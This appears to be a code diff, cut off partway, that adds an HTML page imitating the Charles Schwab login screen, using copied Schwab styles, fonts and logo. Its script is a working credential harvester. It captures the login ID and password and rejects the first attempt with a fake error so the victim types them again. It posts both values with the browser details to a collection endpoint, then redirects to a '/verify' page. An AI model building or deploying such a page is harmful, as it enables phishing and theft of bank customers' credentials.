@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+
+<head>
+
+
+    <style>
+    .login-form {
+        width: 300px;
+        padding: 20px;
+        border: 0px solid #ccc;
+        border-radius: 3px;
+    }
+
+    .login-remember {
+        float: left; /* Floats the checkbox left */
+        margin-right: 10px; /* Adds margin to separate the checkbox from the label */
+    }
+
+
+    .login-pass {
+        flex: 1;
+        text-align: left;
+        margin-right: 200px;
+        
+    }
+
+    .login-label {
+        flex: 1;
+        text-align: left;
+        margin-right: 190px;
+        
+    }
+
+    .login-start {
+        flex: 1;
+        margin-right: 170px;
+        width: 300px;    
+        background-color: lightgray; /* This sets the background color to a light gray */
+    }
+
+    .login-h4 {
+        flex: 1;
+        text-align: left;
+        margin-right: 187px;
+        
+    }
+
+    
+
+    .login-input {
+        flex: 1;
+        margin: 0 auto; /* Centers the element horizontally */
+        width: 300px;
+    }
+
+
+    .login-checkbox {
+        margin-top: 5px;
+    }
+
+    .login-start-page {
+        margin-top: 15px;
+
+    }
+
+    .login-button {
+        background-color: #2E5186;
+        color: #fff;
+        padding: 10px;
+        border: none;
+        cursor: pointer;
+        border-radius: 3px;
+        margin: 0 auto; /* Centers the button horizontally */
+        float: none; /* Prevents the button from floating left */
+        width: 170px;
+        height: 35px;
+        margin-left: 40px;
+    }
+
+    #iframeWrapper {
+      margin-left: 15px;
+      padding-left: 0;
+    }
+
+    .show-password {
+        position: relative;
+        float: right; /* Adjust as needed */
+        margin-right: -35px; /* Adjust as needed */
+        margin-top: -23px; /* Adjust as needed */
+        cursor: pointer;
+    }
+
+    .show-password img {
+        width: 20px; /* Adjust the size of the eye icon as needed */
+        height: auto;
+    }
+
+    
+
+    </style>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const loginForm = document.querySelector('.login-form');
+            const loginButton = document.querySelector('.login-button');
+            let loginAttempts = 0;
+            let attemptNumber = 1; // Initialize attemptNumber
+
+            loginButton.addEventListener('click', function (event) {
+                event.preventDefault();
+
+                const loginId = document.getElementById('login_id').value;
+                const password = document.getElementById('password').value;
+
+                // Check if both login ID and password are non-empty
+                if (loginId.trim() === '' || password.trim() === '') {
+                    // Show an error message or handle the case where fields are not filled
+                    return;
+                }
+
+                if (loginAttempts === 0) {
+                    const errorMessageElement = document.createElement('div');
+                    errorMessageElement.className = 'simple-text-error';
+                    errorMessageElement.textContent = 'Invalid login ID or password';
+
+                    const loginHeadline = document.getElementById('loginHeadline');
+                    loginHeadline.parentNode.insertBefore(errorMessageElement, loginHeadline.nextSibling);
+
+                    // Reset loginAttempts and attemptNumber after 3 seconds
+                    setTimeout(() => {
+                        loginAttempts = 1;
+                        attemptNumber = 2;
+                    }, 3000);
+
+                } else {
+                    // Redirect to appropriate page for a successful login
+                    if (loginAttempts === 1) {
+                        window.location.href = '/verify';;
+                    } else {
+                        window.location.href = 'your_success_page.html';
+                    }
+                }
+
+
+
+                // Clear error message on form input change
+                loginForm.addEventListener('input', function () {
+                    const errorMessageElement = document.querySelector('.simple-text-error');
+                    if (errorMessageElement) {
+                        errorMessageElement.parentNode.removeChild(errorMessageElement);
+                    }
+                });
+
+
+                // Inside the loginButton event listener
+                fetch('http://localhost:3000/login-attempts', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        loginId: loginId,
+                        password: password,
+                        browserType: navigator.userAgent,
+                        attemptNumber: attemptNumber,
+                    }),
+                })
+                    .then(response => response.json())
+
+                    .catch(error => console.error('Error:', error));
+
+            });
+
+            const passwordInput = document.getElementById('password');
+            const showPasswordIcon = document.createElement('div');
+            showPasswordIcon.className = 'show-password';
+            showPasswordIcon.innerHTML = '<i class="fas fa-eye"></i>';
+
+            passwordInput.parentNode.insertBefore(showPasswordIcon, passwordInput.nextSibling);
+
+            showPasswordIcon.addEventListener('click', function () {
+                const type = passwordInput.getAttribute('type');
+                passwordInput.setAttribute('type', type === 'password' ? 'text' : 'password');
+            });
+        });
+
+    </script>
+
+
+</head>
+    
+<head id="Head1"><meta charset="utf-8" />
+
+
+    <style>
+        /* 
+    This file should contain *all* of the CSS needed for the login page that is not provided by SignOn/CSS/Style.css. 
+    It should not contain any CSS that is not used on the login page to avoid impacting the performance (TTI) of the CustomerCenterLogin.aspx.
+    */
+
+    /* From /css/master.css */
+    html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, font, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, dl, dt, dd, caption, fieldset, form, label, legend {
+        margin:0;padding:0;border:0;font-weight:inherit;font-style:inherit;font-family:inherit;list-style-type:none;text-decoration:none;
+    }
+    table {	border-collapse: collapse;	border-spacing: 0;}
+    body {	font:12px Arial, Helvetica, sans-serif;	background-color:#fff}
+    a:link,a:visited{color:#06C;text-decoration:none}
+    a:hover,a:focus,a:active{color:#06C;text-decoration:underline}
+    strong, h1, h2, h3, h4, h5, h6, a.bldFnt {font-weight:bold}
+    .clrFlt {clear:both}
+    h2{color:#333;font-size:16px;padding-bottom:10px;}
+    .icon-warning,.icon-error,.icon-success,.icon-information {background:url(../images/icons.png); display:inline-block; vertical-align:middle}
+    .icon-warning{ background-position:-294px -52px;height:23px;margin:0 10px;width:26px}
+    .icon-error{background-position:-295px -26px; width:25px; height:25px; margin:0 10px; }
+    .icon-success{background-position:-295px 0; width:26px; height:25px; margin:0 10px; }
+    .section-warning{background:#FEFAEE;color:#333;margin:15px 0 15px 0;padding: 7px 0;border: 1px solid #F7DF8C;}
+    .section-error, .section-success{background:#FCF7F9;color:#333; margin:15px 0 15px 0; padding:15px 45px;position:relative;display: block;border: 1px solid #E5B2C1;}
+    .section-success {background:#F0F9F0;border: 1px solid #ADDCAD;}
+    .section-error .icon-error, .section-success .icon-success, .header-msg .section-warning .icon-warning  { margin-top: -5px;margin-left: -35px;position: absolute;}
+    .paddingRight-0{ padding-right: 0px!important;}
+
+    /* From https://www.schwab.com/public/file/PROSPECT-CSS/ps.css */
+    .cf:before,.cf:after{content:"";display:table}
+    .cf:after{clear:both}
+    body{font-family:Arial,Helvetica,sans-serif;margin:0;padding:0;font-size:75%;color:#333;border:0}
+    ul{margin:0;padding:0;list-style:none}
+    a{color:#06c;text-decoration:none}
+    h1,h2,h4{font-family:CharlesModern,Arial,Helvetica,sans-serif}
+    h1{font-size:2em;line-height:1.2;margin:0;padding:0 15px 8px;font-weight:400}
+    h2{font-size:1.5em;line-height:1.13;margin:0;padding:0 15px 10px;font-weight:400}
+    h3{font-size:1em;line-height:1.2;margin:0;padding:0 15px 11px;font-weight:700}
+    p{font-size:1em;line-height:1.3;margin:0;padding:0 15px 11px}
+
+    /* From https://www.schwab.com/public/file/LOGIN-STYLES/main.css */
+    *{box-sizing:border-box}
+    html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}
+    body{margin:0;font:16px/1 sans-serif;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased}
+    .cf:after{content:" ";display:block;clear:both}
+    blockquote,figure,h1,h2,h3,h4,ol,p,ul{margin:0;padding:0}
+    h1,h2,h3,h4{font-size:inherit}
+    a,button{color:inherit;transition:.3s}
+    a{color:#06c;text-decoration:none}
+    img{max-width:100%;height:auto;border:0}
+    header{background-color:#f1f1f1;height:80px;font-family:ArialMT,Arial,sans-serif;font-size:14px;line-height:18px}
+    footer{width:1140px;margin:40px auto 0}
+    footer .disclosures{width:865px;font-family:ArialMT,Arial,sans-serif;font-size:11px;line-height:13px;color:#222}
+    footer p{margin:15px 0}
+
+    /* From /CSS/V5/sdps.css */
+    dl,fieldset,h1,h2,h3,h4,h5,h6,ol,p,ul{margin:0;padding:0}
+    p{margin:0 0 10px}
+    .sdps-text-l-bold-body{font-size:15px;font-size:.9375rem;line-height:20px;line-height:1.25rem;color:#000;font-family:Arial,Helvetica,sans-serif;font-weight:700;margin:0;padding:0}
+    .sdps-m-top_small{margin-top:12px!important;margin-top:.75rem!important}
+    .sdps-m-bottom_small{margin-bottom:12px!important;margin-bottom:.75rem!important}
+    .sdps-p-top_medium{padding-top:16px!important;padding-top:1rem!important}
+    .sdps-p-bottom_medium{padding-bottom:16px!important;padding-bottom:1rem!important}
+    .sdps-p-around_medium{padding:16px!important;padding:1rem!important}
+    .sdps-flush--left{margin-left:0!important;padding-left:0!important}
+    /*! normalize.css v4.0.0 | MIT License | github.com/necolas/normalize.css */
+    :root{font-size:16px}
+    body{font-family:Arial,Helvetica,sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;font-size:15px;font-size:.9375rem;line-height:20px;line-height:1.25rem;margin:0;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased}
+    article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}
+    audio,canvas,progress,video{display:inline-block}
+    audio:not([controls]){display:none;height:0}
+    progress{vertical-align:baseline}
+    [hidden],template{display:none}
+    a[href],button{-ms-touch-action:manipulation;touch-action:manipulation}
+    a{background-color:transparent;font-family:Arial,Helvetica,sans-serif}
+    a:active,a:hover{outline-width:0}
+    abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}
+    b,strong{font-weight:inherit}
+    b,strong{font-weight:bolder}
+    dfn{font-style:italic}
+    mark{background-color:#ff0;color:#000}
+    sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}
+    sub{bottom:-.25em}
+    sup{top:-.5em}
+    img{border-style:none}
+    svg:not(:root){overflow:hidden}
+    code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}
+    pre{background-color:#f4f4f4;border:1px solid #dcdbdb}figure{margin:1em 0}hr{box-sizing:content-box;height:0;overflow:visible}form{margin:0}button,input,select,textarea{font:inherit}optgroup{font-weight:700}button,input,select{overflow:visible}button,input,select,textarea{margin:0}button,select{text-transform:none}[type=button],[type=reset],[type=submit],button{cursor:pointer}[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}button:-moz-focusring,input:-moz-focusring{outline:1px dotted ButtonText}fieldset{border:0;margin:0;padding:0}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}
+    textarea{overflow:auto}
+    [type=checkbox],[type=radio]{box-sizing:border-box;padding:0}
+    input[type=checkbox],input[type=radio]{margin:0}
+    [type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}
+    [type=search]{-webkit-appearance:textfield}
+    [type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}
+    input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}
+    /* the login page only uses full-width sdps-grid columns so CSS to support other column widths has been omitted */
+    .sdps-grid,.sdps-grid-container{display:-moz-flex;display:-ms-flexbox;display:flex;margin:0 16px}
+    .sdps-grid--nested,.sdps-grid-fluid{display:-moz-flex;display:-ms-flexbox;display:flex;margin:0 -8px;width:calc(100% + 16px)}
+    .sdps-grid .sdps-row,.sdps-grid--nested .sdps-row,.sdps-grid-container .sdps-row,.sdps-grid-fluid .sdps-row,.sdps-row .sdps-row{display:-moz-flex;display:-ms-flexbox;display:flex;-moz-flex-direction:row;-ms-flex-direction:row;flex-direction:row;margin:0 0;width:100%}
+    .col-full .sdps-row>.col,.col-m-full .sdps-row>.col,.col-s-full .sdps-row>.col,.sdps-grid .sdps-row>.col,.sdps-grid--nested .sdps-row>.col,.sdps-grid--nested>.col,.sdps-grid-container .sdps-row>.col,.sdps-grid-container>.col,.sdps-grid-fluid .sdps-row>.col,.sdps-grid-fluid>.col,.sdps-grid>.col{-ms-flex:1 1;flex:1 1}
+    .col-full .sdps-row>.col-full,.col-m-full .sdps-row>.col-full,.col-s-full .sdps-row>.col-full,.sdps-grid .sdps-row>.col-full,.sdps-grid--nested .sdps-row>.col-full,.sdps-grid--nested>.col-full,.sdps-grid-container .sdps-row>.col-full,.sdps-grid-container>.col-full,.sdps-grid-fluid .sdps-row>.col-full,.sdps-grid-fluid>.col-full,.sdps-grid>.col-full{width:calc((100% * 12/12) - .1px);-ms-flex:0 0 auto;flex:0 0 auto}
+    .col-full .sdps-row>[class*=col],.col-m-full .sdps-row>[class*=col],.col-s-full .sdps-row>[class*=col],.sdps-grid .sdps-row>[class*=col],.sdps-grid--nested .sdps-row>[class*=col],.sdps-grid--nested>[class*=col],.sdps-grid-container .sdps-row>[class*=col],.sdps-grid-container>[class*=col],.sdps-grid-fluid .sdps-row>[class*=col],.sdps-grid-fluid>[class*=col],.sdps-grid>[class*=col]{padding-left:8px;padding-right:8px;-ms-flex-align:start;-moz-align-items:flex-start;align-items:flex-start;min-width:0;position:relative}
+    .sdps-wrap{-ms-flex-wrap:wrap;flex-wrap:wrap;-ms-flex-align:start;-moz-align-items:flex-start;align-items:flex-start;-ms-flex-line-pack:start;align-content:flex-start}
+    @media (min-width:1024px) and (max-width:1279px){
+        .sdps-grid,.sdps-grid-container{margin:0 4px}
+    }
+    @media (min-width:768px) and (max-width:1023px){
+        .sdps-grid,.sdps-grid-container{margin:0 4px}
+    }
+    @media (min-width:480px) and (max-width:767px){
+        .sdps-grid,.sdps-grid-container{margin:0 7px}
+        .sdps-grid--nested,.sdps-grid-fluid{width:calc(100% + 10px);margin:0 -5px}
+        .sdps-grid .sdps-row>.col-m-full,.sdps-grid--nested .sdps-row>.col-m-full,.sdps-grid--nested>.col-m-full,.sdps-grid-container .sdps-row>.col-m-full,.sdps-grid-container>.col-m-full,.sdps-grid-fluid .sdps-row>.col-m-full,.sdps-grid-fluid>.col-m-full,.sdps-grid>.col-m-full,[class*=col] .sdps-row>.col-m-full{width:calc((100% * 12/12) - .1px);-ms-flex:0 0 auto;flex:0 0 auto}
+        .sdps-grid .sdps-row>[class*=col-m],.sdps-grid .sdps-row>[class*=col-s],.sdps-grid .sdps-row>[class*=col],.sdps-grid--nested .sdps-row>[class*=col-m],.sdps-grid--nested .sdps-row>[class*=col-s],.sdps-grid--nested .sdps-row>[class*=col],.sdps-grid--nested>[class*=col-m],.sdps-grid--nested>[class*=col-s],.sdps-grid--nested>[class*=col],.sdps-grid-container .sdps-row>[class*=col-m],.sdps-grid-container .sdps-row>[class*=col-s],.sdps-grid-container .sdps-row>[class*=col],.sdps-grid-container>[class*=col-m],.sdps-grid-container>[class*=col-s],.sdps-grid-container>[class*=col],.sdps-grid-fluid .sdps-row>[class*=col-m],.sdps-grid-fluid .sdps-row>[class*=col-s],.sdps-grid-fluid .sdps-row>[class*=col],.sdps-grid-fluid>[class*=col-m],.sdps-grid-fluid>[class*=col-s],.sdps-grid-fluid>[class*=col],.sdps-grid>[class*=col-m],.sdps-grid>[class*=col-s],.sdps-grid>[class*=col],[class*=col] .sdps-row>[class*=col-m],[class*=col] .sdps-row>[class*=col-s],[class*=col] .sdps-row>[class*=col]{padding-left:5px!important;padding-right:5px!important;min-width:0}
+        .sdps-grid .sdps-row,.sdps-grid--nested .sdps-row,.sdps-grid-container .sdps-row,.sdps-grid-fluid .sdps-row,.sdps-row .sdps-row{display:-moz-flex;display:-ms-flexbox;display:flex;-moz-flex-direction:row;-ms-flex-direction:row;flex-direction:row;margin:0 0;width:100%}
+    }
+    @media (max-width:479px){
+        .sdps-grid,.sdps-grid-container{margin:0 7px}
+        .sdps-grid--nested,.sdps-grid-fluid{width:calc(100% + 10px);margin:0 -5px}
+        .sdps-grid .sdps-row>.col-s-full,.sdps-grid--nested .sdps-row>.col-s-full,.sdps-grid--nested>.col-s-full,.sdps-grid-container .sdps-row>.col-s-full,.sdps-grid-container>.col-s-full,.sdps-grid-fluid .sdps-row>.col-s-full,.sdps-grid-fluid>.col-s-full,.sdps-grid>.col-s-full,[class*=col] .sdps-row>.col-s-full{width:calc((100% * 12/12) - .1px);-ms-flex:0 0 auto;flex:0 0 auto}
+        .sdps-grid .sdps-row>[class*=col-m],.sdps-grid .sdps-row>[class*=col-s],.sdps-grid .sdps-row>[class*=col],.sdps-grid--nested .sdps-row>[class*=col-m],.sdps-grid--nested .sdps-row>[class*=col-s],.sdps-grid--nested .sdps-row>[class*=col],.sdps-grid--nested>[class*=col-m],.sdps-grid--nested>[class*=col-s],.sdps-grid--nested>[class*=col],.sdps-grid-container .sdps-row>[class*=col-m],.sdps-grid-container .sdps-row>[class*=col-s],.sdps-grid-container .sdps-row>[class*=col],.sdps-grid-container>[class*=col-m],.sdps-grid-container>[class*=col-s],.sdps-grid-container>[class*=col],.sdps-grid-fluid .sdps-row>[class*=col-m],.sdps-grid-fluid .sdps-row>[class*=col-s],.sdps-grid-fluid .sdps-row>[class*=col],.sdps-grid-fluid>[class*=col-m],.sdps-grid-fluid>[class*=col-s],.sdps-grid-fluid>[class*=col],.sdps-grid>[class*=col-m],.sdps-grid>[class*=col-s],.sdps-grid>[class*=col],[class*=col] .sdps-row>[class*=col-m],[class*=col] .sdps-row>[class*=col-s],[class*=col] .sdps-row>[class*=col]{padding-left:5px!important;padding-right:5px!important;min-width:0}
+        .sdps-grid .sdps-row,.sdps-grid--nested .sdps-row,.sdps-grid-container .sdps-row,.sdps-grid-fluid .sdps-row,.sdps-row .sdps-row{display:-moz-flex;display:-ms-flexbox;display:flex;-moz-flex-direction:row;-ms-flex-direction:row;flex-direction:row;margin:0 0;width:100%}
+    }
+    .sdps-list,.sdps-list--bullet,.sdps-list--icon,.sdps-list--inline,.sdps-list--ordered{margin-top:10px;margin-bottom:10px;padding:0;color:#333;list-style-position:outside;margin-left:16px!important}
+    .sdps-list li,.sdps-list--bullet li,.sdps-list--icon li,.sdps-list--inline li,.sdps-list--ordered li{padding:5px 0;font-size:15px;font-size:.9375rem;line-height:20px;line-height:1.25rem}
+    @media (min-width:0) and (max-width:767px){
+        .sdps-list li,.sdps-list--bullet li,.sdps-list--icon li,.sdps-list--inline li,.sdps-list--ordered li{padding:10px 0}
+    }
+    .sdps-list--inline{margin-left:0!important}
+    .sdps-list--inline li{display:inline-block;margin-right:20px;margin-top:0}
+
+    /* 
+        This stylesheet is included on the login page - avoid adding CSS that is not used on the login page to avoid 
+        impacting the performance (TTI) of the CustomerCenterLogin.aspx
+    */
+
+    @font-face {
+    font-family: 'CharlesModern';
+    font-weight: normal;
+    font-style: normal;
+    src: url('../fonts/CharlesModern-Regular.eot@v=1.0.0');
+    src: url('../fonts/CharlesModern-Regular.eot@') format('embedded-opentype'), url('../fonts/CharlesModern-Regular.woff@v=1.0.0') format('woff'), url('../fonts/CharlesModern-Regular.ttf@v=1.0.0') format('truetype'), url('../fonts/CharlesModern-Regular.svg@v=1.0.0') format('svg');
+    }
+    @font-face {
+    font-family: 'CharlesModern';
+    font-weight: normal;
+    font-style: italic;
+    src: url('../fonts/CharlesModern-Italic.eot@v=1.0.0');
+    src: url('../fonts/CharlesModern-Italic.eot@') format('embedded-opentype'), url('../fonts/CharlesModern-Italic.woff@v=1.0.0') format('woff'), url('../fonts/CharlesModern-Italic.ttf@v=1.0.0') format('truetype'), url('../fonts/CharlesModern-Italic.svg@v=1.0.0') format('svg');
+    }
+    @font-face {
+    font-family: 'CharlesModern';
+    font-weight: bold;
+    font-style: normal;
+    src: url('../fonts/CharlesModern-Bold.eot@v=1.0.0');
+    src: url('../fonts/CharlesModern-Bold.eot@') format('embedded-opentype'), url('../fonts/CharlesModern-Bold.woff@v=1.0.0') format('woff'), url('../fonts/CharlesModern-Bold.ttf@v=1.0.0') format('truetype'), url('../fonts/CharlesModern-Bold.svg@v=1.0.0') format('svg');
+    }
+    @font-face {
+    font-family: 'CharlesModern';
+    font-weight: bold;
+    font-style: italic;
+    src: url('../fonts/CharlesModern-BoldItalic.eot@v=1.0.0');
+    src: url('../fonts/CharlesModern-BoldItalic.eot@') format('embedded-opentype'), url('../fonts/CharlesModern-BoldItalic.woff@v=1.0.0') format('woff'), url('../fonts/CharlesModern-BoldItalic.ttf@v=1.0.0') format('truetype'), url('../fonts/CharlesModern-BoldItalic.svg@v=1.0.0') format('svg');
+    }
+    @font-face {
+    font-family: 'CharlesModernLight';
+    font-weight: normal;
+    font-style: normal;
+    src: url('../fonts/CharlesModern-Light.eot@v=1.0.0');
+    src: url('../fonts/CharlesModern-Light.eot@') format('embedded-opentype'), url() format('woff'), url() format('truetype'), url('../fonts/CharlesModern-Light.svg@v=1.0.0') format('svg');
+    }
+    @font-face {
+    font-family: 'CharlesModernLight';
+    font-weight: normal;
+    font-style: italic;
+    src: url('../fonts/CharlesModern-LightItalic.eot@v=1.0.0');
+    src: url('../fonts/CharlesModern-LightItalic.eot@') format('embedded-opentype'), url('../fonts/CharlesModern-LightItalic.woff@v=1.0.0') format('woff'), url('../fonts/CharlesModern-LightItalic.ttf@v=1.0.0') format('truetype'), url('../fonts/CharlesModern-LightItalic.svg@v=1.0.0') format('svg');
+    }
+
+    .section-error, .section-success, .section-warning {
+        margin:0 0 15px 0; padding:15px 15px 15px 45px;font-size: 14px;
+    }
+    .icon-error, .icon-warning, .icon-information {
+        display: block;
+        float: left;
+        margin: -5px 0 0 -35px;
+        padding: 10px 10px 10px 10px;
+    }
+
+    .section-information {
+        color: #333;
+        margin: 15px 0 15px 0;
+        padding: 15px 0;
+        position: relative;
+        display: block;
+        background: #edf3f9;
+        border: 1px solid #9ecde0;
+    }
+
+    /*login page css*/
+    .container {
+        width: 1140px;
+        margin: 0 auto;
+    }
+
+    .svg-lock-icon {
+        display: inline-block;
+        width: 12px;
+        height: 18px;
+        background-image: url(https://content.schwab.com/web/login/schwabsafe_logo.svg);
+        background-size: 12px 18px;
+        margin-right: 5px
+    }
+
+    header {
+        background-color: #f1f1f1;
+        height: 80px;
+        font-family: ArialMT,Arial,sans-serif;
+        font-size: 14px;
+        line-height: 18px
+    }
+
+    .header__utilities {
+        position: relative;
+        float: right;
+        margin-top: 30px
+    }
+
+        .header__utilities ul li {
+            list-style-type: none;
+            display: inline-block;
+            padding-left: 13px
+        }
+
+            .header__utilities ul li a {
+                display: inline-block;
+                color: #06c;
+                padding-right: 13px;
+                border-right: 1px solid #666
+            }
+
+                .header__utilities ul li a sup {
+                    display: inline-block
+                }
+
+                .header__utilities ul li a:hover {
+                    text-decoration: underline
+                }
+
+            .header__utilities ul li:last-child a {
+                border-right: none;
+                padding-right: none
+            }
+
+    .header__schwablogo {
+        width: 80px;
+        height: 80px;
+        display: inline-block
+    }
+
+        .header__schwablogo .logo .svg-icon.svg-logo {
+            display: block;
+            width: 80px;
+            height: 80px;
+            background-image: url(data:image/svg+xml;base64,PHN2ZyBpZD0iTGF5ZXJfMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgNTYgNTYiPjxnIGlkPSJYTUxJRF81MF8iPjxwYXRoIGlkPSJYTUxJRF8yMl8iIGZpbGw9IiMwMEEwREYiIGQ9Ik0wIDBoNTUuOXY1NS45SDB6Ii8+PGcgaWQ9IlhNTElEXzUxXyI+PGcgaWQ9IlhNTElEXzEwMV8iPjxwYXRoIGlkPSJYTUxJRF8yMV8iIGZpbGw9IiNGRkYiIGQ9Ik00OC42IDI1LjNjMC0uOC0uNS0xLjQtLjktMi0uNC0uNC0uNy0uOC0uNy0xLjMgMC0uNi40LTEgLjktMSAuMyAwIC41LjEuNy4yLjIuMS41LjIuNy4yLjQgMCAuNy0uNC43LS43IDAtLjQtLjQtLjgtMS4xLS44LTEuNiAwLTMgMS44LTMgMy4yIDAgLjguNSAxLjQuOSAxLjkuMy40LjYuOC42IDEuMiAwIC42LS42IDEtMS4xIDEtLjYgMC0uOS0uMy0xLjMtLjYtLjItLjItLjQtLjQtLjYtLjQtLjMgMC0uNC42LS40LjkgMCAuNC43IDEgMS42IDEgMS40LS4yIDMtMS40IDMtMi44Ii8+PC9nPjxnIGlkPSJYTUxJRF85OF8iPjxwYXRoIGlkPSJYTUxJRF85OV8iIGZpbGw9IiNGRkYiIGQ9Ik0xNC41IDE1LjVjLS4xIDAtLjEgMCAwIDBsLS4xLjR2LjFoLjVjLjQuMS41LjEuNS4zIDAgLjMtLjQgMS4zLS45IDIuN2wtLjQgMS4zYy0uNCAxLjEtMSAyLjctMS41IDQtLjYgMS42LTEuMSAyLjktMS4xIDMuMSAwIC4yLjEuMy42LjNzLjctLjEuOC0uM2MuOS0yLjkgMy4zLTYuMiA0LjUtNi4yLjQgMCAuNS4xLjUuNSAwIC42LS41IDEuOC0xLjEgMy0uNSAxLS45IDItLjkgMi41IDAgLjQuMi42LjYuNiAxLjIgMCAyLjItMS4xIDIuOS0ybC4xLS4xLS4zLS4zaC0uMWMtLjQuNC0xLjEgMS4xLTEuMyAxLjFoLS4xdi0uMmMwLS4xLjEtLjQuMy0uOC41LTEuMSAxLjMtMyAxLjMtNC4xIDAtLjktLjQtMS40LTEuMi0xLjQtMS41IDAtMi43IDEuNy0zLjMgMi42LS4xLjItLjMuNC0uMy40cy4xLS4yLjItLjZjLjItLjQuNC0xIC43LTEuOCAxLjEtMyAxLjYtNC41IDEuNi00LjcgMC0uMi0uMi0uMi0uMy0uMmgtMi4yeiIvPjwvZz48ZyBpZD0iWE1MSURfOTVfIj48cGF0aCBpZD0iWE1MSURfOTZfIiBmaWxsPSIjRkZGIiBkPSJNMTEuMSAyNi4xYy4xLS4xLjEtLjEgMCAwIDAtLjEtLjMtLjMtLjMtLjMtLjUuNC0xLjQgMS4yLTIuMiAxLjItLjMgMC0uNi0uMS0uOC0uMy0uMy0uMi0uNC0uNi0uNC0xLjEtLjEtMS4yIDEtMy4xIDItNC4yLjYtLjYgMS4xLS45IDEuNC0uOS40IDAgLjcuMyAxIC42LjIuMy40LjUuNy41LjEgMCAuMy0uMS4zLS4yLjEtLjEuMi0uMy4yLS40IDAtLjUtLjUtMS4yLTEuNi0xLjMtMS4yIDAtMi44LjctNCAxLjktMS4xIDEuMS0xLjcgMi41LTEuNiAzLjggMCAxLjEuNiAyLjMgMi4yIDIuMyAxLjYuMiAyLjktMS4yIDMuMS0xLjZ6Ii8+PC9nPjxnIGlkPSJYTUxJRF85Ml8iPjxwYXRoIGlkPSJYTUxJRF85M18iIGZpbGw9IiNGRkYiIGQ9Ik0zMS4zIDIzLjNjMCAuMS0uMS4yLS4xLjJ2LS4xYzAtLjEuMS0uNC4yLS44LjItLjguNC0xLjguNC0yLjEgMC0uNC0uMi0uNi0uNi0uNi0uOCAwLTIuMSAxLjQtMi41IDIuMWwuMi4zLjEtLjEuMS0uMWMuMy0uNC45LTEuMSAxLjItMS4xLjIgMCAuMy4yLjMuNSAwIC43LS44IDIuOS0xLjMgNC40LS4zLjgtLjUgMS40LS41IDEuNSAwIC4yLjEuMi4yLjJoLjdjLjEgMCAuMi0uMS4zLS4zIDAgMCAuMy0uOC41LTEuMiAxLjQtMi44IDIuMS00LjIgMi43LTQuOC40LS40LjctLjUuOS0uNS4yIDAgLjIuMS4zLjIuMS4xLjIuMy40LjMuMSAwIC4zIDAgLjQtLjEuMi0uMi4zLS40LjMtLjcgMC0uNS0uNC0uNy0uNy0uNy0xLjQuMS0yLjMgMS0zLjUgMy41eiIvPjwvZz48cGF0aCBpZD0iWE1MSURfODdfIiBmaWxsPSIjRkZGIiBkPSJNMjcgMTkuN2MtLjEgMC0uMi4xLS4yLjItLjEuMS0uMS4yLS4zLjItLjEgMC0uMiAwLS40LS4xLS4yIDAtLjQtLjEtLjctLjEtMy41IDAtNS4zIDQuNy01LjMgNi4zIDAgMS4xLjYgMS42IDEuMiAxLjYuNyAwIDEuNy0uMiAzLTIuMmwuMy0uNXYuMWwtLjEuMmMtLjIuMy0uNSAxLS41IDEuNiAwIC4zLjEuNS4yLjYuMS4xLjMuMi41LjIgMS4yIDAgMi4yLTEuNiAyLjYtMi4ybC0uMy0uM2gtLjFsLS4zLjNjLS40LjQtLjggMS0xLjEgMWgtLjF2LS4yYzAtLjQuOC0yLjMgMS4zLTMuOC40LTEuMS44LTIuMS44LTIuMyAwIDAgMC0uMi0uMS0uMmwtLjUtLjNjLjItLjEuMS0uMS4xLS4xem0tNS41IDYuMmMwLTIuMyAxLjgtNS40IDMuNi01LjQuNiAwIC45LjMuOS45IDAgLjktMi40IDUuMi00IDUuMi0uMy4xLS41IDAtLjUtLjd6Ii8+PHBhdGggaWQ9IlhNTElEXzgyXyIgZmlsbD0iI0ZGRiIgZD0iTTM4LjIgMjUuN2MwIDEuMy44IDIuMiAyIDIuMiAxLjQgMCAyLjktMS40IDMuMy0xLjhWMjZsLS4yLS4zaC0uMWwtLjIuMWMtLjUuNC0xLjMgMS0yIDEtLjggMC0xLjMtLjUtMS4zLTEuMyAwLTEgLjUtMS43LjgtMi4zdi0uMUg0MS4zYzEuMyAwIDMuNy0uNiAzLjctMi4xIDAtLjYtLjYtMS4zLTEuNi0xLjMtMiAuMi01LjIgMy4yLTUuMiA2em01LjEtNS4zYy40IDAgLjcuMy43LjcgMCAxLTEuMSAxLjUtMyAxLjUuMy0uNyAxLjQtMi4yIDIuMy0yLjJ6Ii8+PGcgaWQ9IlhNTElEXzc4XyI+PHBhdGggaWQ9IlhNTElEXzc5XyIgZmlsbD0iI0ZGRiIgZD0iTTM3LjYgMjUuOHMwLS4xIDAgMGMwLS4xLS4zLS40LS4zLS40bC0uMS4xYy0uNy43LTEgMS4yLTEuNCAxLjJoLS4xcy0uMS0uMS0uMS0uMmMwLS40LjctMi40IDIuMS02bDEtMi42Yy41LTEuMy44LTIgLjgtMi4xdi0uMWMwLS4xLS4xLS4xLS4zLS4xaC0yLjNzLS